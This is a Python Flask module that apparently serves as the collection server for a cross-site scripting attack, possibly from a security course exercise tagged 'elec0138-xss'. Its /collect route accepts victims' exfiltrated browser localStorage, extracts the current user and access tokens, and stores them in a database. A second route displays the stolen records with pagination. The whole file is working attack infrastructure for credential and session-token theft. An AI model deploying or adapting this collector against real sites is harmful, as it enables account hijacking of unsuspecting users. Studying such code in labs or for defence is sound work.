import json
from datetime import datetime

from flask import Blueprint, request, render_template, jsonify, current_app
from sqlalchemy.exc import SQLAlchemyError

from . import db
from .models import CollectedData

main_bp = Blueprint('main', __name__)


def _parse_local_storage(raw_json):
    try:
        return json.loads(raw_json)
    except (TypeError, json.JSONDecodeError):
        raise ValueError("Invalid JSON in localStorage")


@main_bp.route('/collect')
def collect():
    """Collect and store client data via query parameters."""
    current_app.logger.info("/collect called with args: %s", request.args)

    dt = request.args.get('dt')
    raw_ls = request.args.get('ls')

    # Basic validations
    if dt != 'elec0138-xss':
        current_app.logger.warning("Invalid data type: %s", dt)
        return jsonify(error="Invalid data type"), 400

    if not raw_ls:
        current_app.logger.warning("Missing localStorage data")
        return jsonify(error="Missing localStorage data"), 400

    try:
        local_storage = _parse_local_storage(raw_ls)
    except ValueError as e:
        current_app.logger.warning(str(e))
        return jsonify(error=str(e)), 400

    new_data = CollectedData(
        timestamp=datetime.now().isoformat(),
        current_user=local_storage.get('currentUser', ''),
        access_token=local_storage.get('access_token', ''),
    )

    try:
        db.session.add(new_data)
        db.session.commit()
        return '', 204
    except SQLAlchemyError:
        current_app.logger.exception("Database error while storing data")
        db.session.rollback()
        return jsonify(error="Database error"), 500


@main_bp.route('/')
def display_data():
    """Render collected data with pagination."""
    page = request.args.get('page', 1, type=int)
    per_page = current_app.config.get('PER_PAGE', 50)

    try:
        pagination = CollectedData.query.order_by(
            CollectedData.id.desc()
        ).paginate(page=page, per_page=per_page, error_out=False)

        return render_template(
            'index.html',
            data=pagination.items,
            pagination=pagination,
            now={'year': datetime.now().year},
        )

    except SQLAlchemyError:
        current_app.logger.exception("Database error fetching records")
        error_msg = "Database error occurred"
    except Exception as e:
        current_app.logger.exception(f"Unexpected error retrieving data: {e}")
        error_msg = "Error retrieving data"

    return render_template('index.html', data=[], error=error_msg)
